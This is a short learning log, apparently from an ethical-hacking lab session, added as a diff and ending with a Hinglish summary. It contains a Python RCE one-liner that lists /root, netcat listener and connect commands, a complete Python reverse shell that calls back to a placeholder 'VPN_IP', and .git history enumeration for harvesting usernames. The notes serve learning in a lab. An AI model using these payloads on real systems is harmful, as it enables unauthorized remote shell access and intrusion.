@@ -1,0 +1,49 @@
+💻 Ethical Hacking Learning — Kali Linux + Netcat + TCP Shell
+📂 1. Root Directory Enumeration
+Listed /root, /var, and /opt directories using Python RCE payloads:
+
+python
+Copy
+Edit
+print(__import__('os').popen('ls /root').read())
+🌐 2. Netcat (nc) & TCP Connections
+Understood how Netcat establishes TCP connections:
+
+bash
+Copy
+Edit
+nc 10.10.x.x 8000
+Realized Netcat is used for:
+
+Reverse shells
+
+Port listening (nc -lvnp 4444)
+
+Sending/receiving data over raw sockets
+
+🐍 3. Python TCP Reverse Shell Basics
+Explored reverse shell payload in Python:
+
+python
+Copy
+Edit
+import socket, os
+s = socket.socket()
+s.connect(("VPN_IP", 443))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+import pty; pty.spawn("/bin/sh")
+🔍 4. .git Directory Enumeration (Privilege Recon)
+Navigated into .git directory using:
+
+bash
+Copy
+Edit
+git --git-dir=/opt/dev/.git log
+git --git-dir=/opt/dev/.git show <commit_hash>
+Extracted commit history to find dev info (e.g., usernames, shell endpoints)
+
+✅ Daily Summary (One-liner):
+"Aaj ka din base strong karne ka tha — Python ke primitive data types se leke reverse shell aur Netcat ke real-world usage tak har concept clear kiya."
+
